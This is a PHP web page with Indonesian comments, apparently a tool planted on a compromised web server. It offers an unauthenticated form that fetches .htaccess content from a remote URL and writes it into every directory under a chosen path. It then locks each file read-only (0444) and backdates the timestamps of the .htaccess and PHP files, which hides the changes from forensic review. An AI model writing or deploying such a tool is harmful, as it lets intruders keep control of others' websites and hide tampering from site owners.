<?php
// Pengaturan untuk menampilkan error dan flushing
ini_set('display_errors', 1);
error_reporting(E_ALL);
ob_implicit_flush(true); // Aktifkan flushing output secara otomatis

// ===================================================================
// DEFINISI FUNGSI (TETAP SAMA)
// ===================================================================

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
}

// -- FUNGSI-FUNGSI DI BAWAH INI TELAH DIMODIFIKASI UNTUK LANGSUNG ECHO --

function setFolders0755($dir) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            if (@chmod($path, 0755)) {
                echo "<div class='success'>✅ Folder chmod 0755: " . htmlspecialchars($path) . "</div>";
            } else {
                echo "<div class='error'>❌ Gagal chmod folder: " . htmlspecialchars($path) . "</div>";
            }
            setFolders0755($path);
        }
    }
}

function setFiles0644($dir) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            setFiles0644($path);
        } elseif (is_file($path)) {
            if (@chmod($path, 0644)) {
                echo "<div class='success'>✅ File chmod 0644: " . htmlspecialchars($path) . "</div>";
            } else {
                echo "<div class='error'>❌ Gagal chmod file: " . htmlspecialchars($path) . "</div>";
            }
        }
    }
}

function unlockHtaccessFiles($dir) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            unlockHtaccessFiles($path);
        } elseif ($item === '.htaccess') {
            if (@chmod($path, 0644)) {
                echo "<div class='success'>✅ Unlock .htaccess: " . htmlspecialchars($path) . "</div>";
            } else {
                echo "<div class='error'>❌ Gagal unlock .htaccess: " . htmlspecialchars($path) . "</div>";
            }
        }
    }
}

function deployHtaccess($dir, $content, $timestamp = false) {
    if (!is_readable($dir)) { return; }
    $items = @scandir($dir);
    if ($items === false) { return; }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;

        if (is_dir($path)) {
            $htaccessPath = $path . '/.htaccess';
            if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
                @chmod($htaccessPath, 0644);
            }
            
            if (@file_put_contents($htaccessPath, $content) === false) {
                echo "<div class='error'>❌ Gagal deploy ke: " . htmlspecialchars($htaccessPath) . "</div>";
            } else {
                echo "<div class='success'>✅ Deployed .htaccess: " . htmlspecialchars($htaccessPath) . "</div>";
                if (@chmod($htaccessPath, 0444)) {
                    echo "<div class='success'>🔒 .htaccess dikunci (0444): " . htmlspecialchars($htaccessPath) . "</div>";
                } else {
                    echo "<div class='error'>❌ Gagal chmod .htaccess 0444: " . htmlspecialchars($htaccessPath) . "</div>";
                }
                if ($timestamp && @touch($htaccessPath, $timestamp)) {
                    echo "<div class='success'>⏱️ Timestamp set untuk " . htmlspecialchars($htaccessPath) . "</div>";
                } elseif ($timestamp) {
                    echo "<div class='error'>❌ Gagal set timestamp: " . htmlspecialchars($htaccessPath) . "</div>";
                }
            }
            deployHtaccess($path, $content, $timestamp);
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
            if (@touch($path, $timestamp)) {
                echo "<div class='success'>⏱️ Timestamp set untuk PHP: " . htmlspecialchars($path) . "</div>";
            } else {
                echo "<div class='error'>❌ Gagal set timestamp untuk PHP: " . htmlspecialchars($path) . "</div>";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass .htaccess Deployment</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
        button { background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; min-height: 100px; }
        .success { color: #0f0; }
        .error { color: #f33; }
        .info { color: #0af; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <h2>🚀 Mass .htaccess Deployment</h2>
    
    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): // Tampilkan form hanya jika bukan POST request ?>
    <form method="POST">
        <label>🎯 Target Path:</label>
        <input type="text" name="target_path" placeholder="/var/www/html" required>
        <label>🌐 URL .htaccess (GitHub raw, dll):</label>
        <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>
        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
        <input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
        <button type="submit">🚀 Deploy Sekarang</button>
    </form>
    <?php endif; ?>

    <div class="log">
        <?php
        // ===================================================================
        // LOGIKA UTAMA HANYA BERJALAN SAAT REQUEST ADALAH POST
        // ===================================================================
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            echo "<h3>Proses Dimulai...</h3>";

            $targetPath = rtrim($_POST['target_path'], '/');
            $url = $_POST['htaccess_url'];
            $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

            if (!is_dir($targetPath)) {
                echo "<div class='error'>❌ Target path not found: " . htmlspecialchars($targetPath) . "</div>";
            } else {
                $htaccessContent = fetchFileFromUrl($url);
                if (!$htaccessContent) {
                    echo "<div class='error'>❌ Gagal ambil isi .htaccess dari URL.</div>";
                } else {
                    echo "<div class='info'>--- 🔧 LANGKAH 1: Set Permission Folder & File ---</div>";
                    setFolders0755($targetPath);
                    setFiles0644($targetPath);
                    
                    echo "<div class='info'>--- 🔓 LANGKAH 2: UNLOCK .htaccess jika ada ---</div>";
                    unlockHtaccessFiles($targetPath);

                    echo "<div class='info'>--- 🚀 LANGKAH 3: MASS DEPLOY .htaccess ---</div>";
                    deployHtaccess($targetPath, $htaccessContent, $timestamp);
                    
                    echo "<h3 style='color:#0f0;'>✅ Proses Selesai.</h3>";
                }
            }
        }
        ?>
    </div>
</body>
</html>
